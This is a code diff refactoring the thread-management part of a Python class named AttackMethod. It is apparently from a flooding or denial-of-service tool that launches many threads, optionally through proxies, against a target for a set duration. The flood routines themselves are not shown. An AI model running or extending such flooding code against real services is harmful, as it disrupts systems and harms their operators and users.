@@ -97,15 +97,17 @@ class AttackMethod:
             try:
                 self.method(args[0], args[1])
             except (ConnectionResetError, BrokenPipeError):
-                sock, proxy = create_socket_proxy(self.target)
-                self.thread = Thread(target=self.__run_flood, args=(sock, proxy))
+                self.thread = Thread(
+                    target=self.__run_flood, args=create_socket_proxy(self.target)
+                )
                 self.thread.start()
         else:
             try:
                 self.method(args[0])
             except (ConnectionResetError, BrokenPipeError):
-                sock = create_socket(self.target)
-                self.thread = Thread(target=self.__run_flood, args=(sock,))
+                self.thread = Thread(
+                    target=self.__run_flood, args=(create_socket(self.target),)
+                )
                 self.thread.start()
         sleep(self.sleep_time)
 
@@ -127,11 +129,13 @@ class AttackMethod:
         ) as spinner:
             for index in range(self.threads_count):
                 if "proxy" in self.method_name:
-                    sock, proxy = create_socket_proxy(self.target)
-                    yield Thread(target=self.__run_flood, args=(sock, proxy))
+                    yield Thread(
+                        target=self.__run_flood, args=create_socket_proxy(self.target)
+                    )
                 else:
-                    sock = create_socket(self.target)
-                    yield Thread(target=self.__run_flood, args=(sock,))
+                    yield Thread(
+                        target=self.__run_flood, args=(create_socket(self.target),)
+                    )
                 spinner.step(100 / self.threads_count * (index + 1))
 
     def __start_threads(self) -> None:
@@ -157,8 +161,7 @@ class AttackMethod:
         self.__start_threads()
 
         # Timer starts counting after all threads were started.
-        timer = Thread(target=self.__run_timer)
-        timer.start()
+        Thread(target=self.__run_timer).start()
 
         # Close all threads after the attack is completed.
         for thread in self.threads:
@@ -173,7 +176,7 @@ class AttackMethod:
         duration = format_timespan(self.duration)
 
         print(
-            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target.split('http://')[1]} {F.BLUE}({ip}:{port})"
+            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target} {F.BLUE}({ip}:{port})"
             f" using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
             f"[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
         )
